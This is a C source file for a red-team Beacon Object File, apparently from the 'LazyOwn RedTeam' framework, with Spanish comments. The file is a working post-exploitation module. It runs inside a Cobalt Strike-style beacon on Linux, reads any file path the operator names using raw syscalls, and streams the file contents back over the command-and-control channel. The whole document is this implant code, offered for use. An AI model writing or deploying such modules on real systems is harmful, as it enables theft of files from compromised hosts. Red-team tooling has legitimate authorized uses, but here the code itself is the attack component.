// readfile.c — LazyOwn RedTeam BOF (Linux/x64)
#define NULL ((void*)0)
#define CALLBACK_OUTPUT 0

// Tipos
typedef unsigned long size_t;
typedef long ssize_t;

// Símbolos del beacon
extern void BeaconPrintf(int, const char*, ...);
extern void BeaconOutput(int, const char*, int);

// Syscalls (ya usadas en whoami/is_sudo)
#define SYS_openat 257
#define SYS_read   0
#define SYS_close  3
#define AT_FDCWD   -100

// Wrappers (copiados de tus ejemplos)
static inline long syscall3(long n, long a1, long a2, long a3) {
    long ret;
    __asm__ volatile ("syscall"
        : "=a"(ret)
        : "a"(n), "D"(a1), "S"(a2), "d"(a3)
        : "rcx", "r11", "memory"
    );
    return ret;
}

void go(char *args, int alen) {
    if (alen <= 0 || !args || args[0] == '\0') {
        BeaconPrintf(CALLBACK_OUTPUT, "[READFILE] ❌ Ruta no proporcionada\n");
        return;
    }

    // Asumimos que args es una cadena terminada en nulo (Cobalt Strike lo garantiza)
    char *filepath = args;

    BeaconPrintf(CALLBACK_OUTPUT, "[READFILE] 📂 Leyendo: %s\n", filepath);

    long fd = syscall3(SYS_openat, AT_FDCWD, (long)filepath, 0);
    if (fd < 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "[READFILE] ❌ Error al abrir el archivo\n");
        return;
    }

    char buffer[4096];
    long total_read = 0;
    long n;

    // Leer en bloques y enviar cada bloque vía BeaconOutput
    while ((n = syscall3(SYS_read, fd, (long)buffer, sizeof(buffer))) > 0) {
        BeaconOutput(CALLBACK_OUTPUT, buffer, (int)n);
        total_read += n;
    }

    syscall3(SYS_close, fd, 0, 0);

    BeaconPrintf(CALLBACK_OUTPUT, "[READFILE] ✅ Leídos %ld bytes\n", total_read);
}
